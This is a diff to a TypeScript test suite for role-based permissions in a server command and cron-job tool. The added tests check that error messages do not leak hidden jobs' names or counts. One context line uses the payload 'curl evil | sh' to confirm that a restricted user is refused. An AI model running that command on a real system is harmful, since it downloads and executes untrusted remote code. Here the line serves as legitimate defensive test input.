@@ -380,6 +380,30 @@ describe('saved commands and cron jobs under custom roles', () => {
         payload: { command: 'curl evil | sh' },
       });
       expect(res.statusCode).toBe(403);
+      // Nothing about the job the member cannot see: not its name, not how many
+      expect(res.json().error).not.toMatch(/runs-used|cron job|\d/);
+    });
+
+    it('refusing to delete a command in use counts only the jobs the caller sees', async () => {
+      const used = seedCommand('used-by-hidden');
+      seedJob('hidden-user-1', s1, users.admin.userId, used);
+      seedJob('hidden-user-2', s1, users.admin.userId, used);
+      const member = seedUser(orgId, 'viewer');
+      scopeToRoles(member.userId);
+      grant({ user: member.userId }, 'saved_command', 'manage', used);
+      grant({ user: member.userId }, 'server', 'operate', s1);
+      const del = (who: { headers: Record<string, string> }) =>
+        app.inject({ remoteAddress: ip(), method: 'DELETE', url: `/api/commands/${used}`, headers: who.headers });
+
+      const hidden = await del(member);
+      expect(hidden.statusCode).toBe(409);
+      expect(hidden.json().error).not.toMatch(/hidden-user|\d/);
+      // One of the two in sight: still no count
+      const [first] = getDb().select({ id: cronJobs.id }).from(cronJobs).where(eq(cronJobs.savedCommandId, used)).all();
+      grant({ user: member.userId }, 'cron_job', 'view', first!.id);
+      expect((await del(member)).json().error).not.toMatch(/\d/);
+      // Everyone in sight: the count helps
+      expect((await del(users.admin)).json().error).toContain('used by 2 cron jobs');
     });
 
     it('the AI tools and prompt list only what the member reaches', async () => {
@@ -454,6 +478,18 @@ describe('saved commands and cron jobs under custom roles', () => {
       const base = { id: j1, orgId, createdBy: users.roleOp.userId, serverId: s1, inlineCommand: null };
       expect(creatorRefusal({ ...base, savedCommandId: c1 })).toBeNull();
       expect(creatorRefusal({ ...base, savedCommandId: c2 })).toMatch(/saved command/);
+    });
+
+    it('needs to still see the server the saved command is bound to', () => {
+      const bound = seedCommand('bound-for-cron');
+      grant({ user: users.roleOp.userId }, 'saved_command', 'operate', bound);
+      const base = { id: j1, orgId, createdBy: users.roleOp.userId, serverId: s1, inlineCommand: null, savedCommandId: bound };
+      // Bound to a server the creator sees (s2, view): runs on s1 as before
+      getDb().update(savedCommands).set({ serverId: s2 }).where(eq(savedCommands.id, bound)).run();
+      expect(creatorRefusal(base)).toBeNull();
+      // Bound to one they cannot see (s3): the command is hidden from them, so the job stops
+      getDb().update(savedCommands).set({ serverId: s3 }).where(eq(savedCommands.id, bound)).run();
+      expect(creatorRefusal(base)).toMatch(/saved command/);
     });
 
     it('stops once the creator leaves the role', () => {
